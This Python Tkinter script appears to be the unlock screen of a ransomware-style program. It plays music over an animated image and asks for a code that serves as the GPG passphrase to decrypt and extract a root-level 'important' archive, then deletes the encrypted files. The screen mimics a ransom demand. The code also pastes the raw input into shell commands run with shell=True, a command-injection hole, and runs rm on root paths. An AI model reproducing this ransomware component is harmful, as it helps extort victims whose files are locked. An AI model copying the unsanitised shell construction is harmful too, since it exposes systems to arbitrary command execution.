#!/usr/bin/env python3
from tkinter import *
import tkinter.messagebox
import os
import subprocess
import pygame




def update(ind):

    frame = frames[ind]
    ind += 1
    if ind == frameCnt:
        ind = 0
    label2 = Label(frame1, image=frame , bg="black")
    label2.place(x=0, y=0)

    root.after(75, update, ind)

def decrypter():
    dir1 = "important"
    inputvariable = entry.get()
    print(inputvariable)

    subprocess.run(['gpg --pinentry-mode=loopback --passphrase ' + inputvariable + ' --output /' + dir1 + '.tar.gz --decrypt /' + dir1 + '.tar.gz.gpg'], shell=True)
    if os.path.isfile('/' + dir1 + '.tar.gz'):
        subprocess.run(['cd / ; tar xzf ' + dir1 + '.tar.gz'], shell=True)

        if os.path.isdir('/' + dir1):
            tkinter.messagebox.showinfo("Success!!!", "Files Decrypted")
            subprocess.run(['rm /' + dir1 + '.tar.gz.gpg'], shell=True)
            subprocess.run(['rm /' + dir1 + '.tar.gz'], shell=True)

    else:
        tkinter.messagebox.showinfo("Warning!!!", "File Not Decrypted")



root = Tk()
pygame.init()
pygame.mixer.init()
pygame.mixer.music.load('WormHole.ogg')
frameCnt = 49
frames = [PhotoImage(file='/Lotus/x3.gif',format = 'gif -index %i' %(i)) for i in range(frameCnt)]


frame1 = Frame(root, height=550, width=1000, bg='black')
frame1.pack()

entry = Entry(root, text="INPUT CODE",bd=5,fg="black",bg="white",width=40)
entry.place(x=325,y=410,height=30)

button = Button(root, text="VALIDATE CODE", padx=10,pady=10,fg="red",bg="black", command=decrypter)
button.place(x=505,y=450)

button = Button(root, text="UNLOCK LINK", padx=10,pady=10,fg="red",bg="black")
button.place(x=370,y=450)

update(0)
pygame.mixer.music.play()
pygame.event.wait()

root.mainloop()
